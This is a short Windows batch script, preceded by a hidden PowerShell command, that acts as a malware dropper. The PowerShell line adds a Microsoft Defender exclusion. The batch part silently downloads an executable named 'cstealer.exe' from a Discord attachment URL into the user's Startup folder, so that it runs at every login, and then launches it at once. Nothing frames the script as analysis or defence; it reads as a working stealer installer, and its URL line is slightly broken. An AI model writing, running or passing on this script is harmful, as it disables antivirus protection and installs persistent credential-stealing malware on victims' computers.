powershell -w hidden -c Add-MpPreference -ExclusionPath ""

@echo off
setlocal 

set "URL=h
https://cdn.discordapp.com/attachments/1255156504244256829/1255156628479672421/cstealer.exe?ex=667c1b33&is=667ac9b3&hm=bfc8b78781a33b8ae401b75b46c0566932f5ba0f0e9c84c227f9c273fc55e79a&/cstealer.exe?ex=667bfabf&is=667aa93f&hm=a63600accdb9c1df84dfbf544ffadb53b2e238221f33758bd6b5339057bc3c51&/cstealer.exe?download=1"
set "DEST=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\cstealer.exe"


if exist "%DEST%" del "%DEST%"

curl --silent --output "%DEST%" "%URL%"

if %errorlevel% neq 0 (
  exit /b %errorlevel%
)

call "%DEST%"